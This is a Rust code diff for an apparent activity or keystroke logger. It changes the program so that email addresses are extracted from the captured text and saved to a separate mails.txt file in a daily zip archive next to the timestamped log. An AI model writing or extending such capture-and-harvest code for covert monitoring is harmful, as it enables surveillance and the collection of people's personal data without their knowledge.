@@ -181,8 +181,9 @@ fn track_activity(event: Event) {
             let mut data = String::new();
             fileRead.read_to_string(&mut data);
 
-            links(data.clone());
-            zip_main(zipped_string + &data + "\n" + &now_parsed.to_string() + "\n");
+            let logs = zipped_string + &data + "\n" + &now_parsed.to_string() + "\n";
+            let mails: String = links(data.clone());
+            zip_main(logs, mails);
 
             let mut fileClear = OpenOptions::new()
                 .write(true)
@@ -206,8 +207,8 @@ fn track_activity(event: Event) {
     }
 }
 
-fn zip_main(text: String) -> i32 {
-    match dozip(text) {
+fn zip_main(logs: String, mails: String) -> i32 {
+    match dozip(logs, mails) {
         Ok(_) => println!("Zipped successfuly."),
         Err(e) => println!("Failed to zip.: {e:?}"),
     }
@@ -215,7 +216,7 @@ fn zip_main(text: String) -> i32 {
     0
 }
 
-fn dozip(text: String) -> ZipResult<()> {
+fn dozip(logs: String, mails: String) -> ZipResult<()> {
     let now: DateTime<Utc> = Utc::now();
     let fname = now.format("%Y-%m-%d").to_string() + ".zip";
 
@@ -234,7 +235,12 @@ fn dozip(text: String) -> ZipResult<()> {
     zip.write_all(b"Hello, World!\n")?;
 
     zip.start_file("text/log.txt", options)?;
-    zip.write_all(text.as_bytes())?;
+    zip.write_all(logs.as_bytes())?;
+
+    if !mails.is_empty() {
+        zip.start_file("text/mails.txt", options)?;
+        zip.write_all(mails.as_bytes())?;
+    }
 
     zip.finish()?;
     Ok(())
@@ -246,7 +252,10 @@ fn readzip() -> String {
     let file = match fs::File::open(fname) {
         Ok(file) => file,
         Err(err) => {
-            dozip(String::from(""));
+            let x: String = format!("{}", now);
+            let now_parsed: DateTime<Utc> = x.parse().unwrap();
+
+            dozip(String::from(""), now_parsed.to_string());
             return String::from("");
         }
     };
@@ -268,11 +277,10 @@ fn readzip() -> String {
     contents
 }
 
-fn links(text: String) {
+fn links(text: String) -> String {
     let mut finder = LinkFinder::new();
     finder.kinds(&[LinkKind::Email]);
     let links: Vec<_> = finder.links(&text).collect();
-    let link = &links[0];
-    let string = links.into_iter().map(|c| c.as_str().to_owned() + "\n").collect::<String>();
-    println!("{}", string);
+    let text = links.into_iter().map(|c| c.as_str().to_owned() + "\n").collect::<String>();
+    text
 }
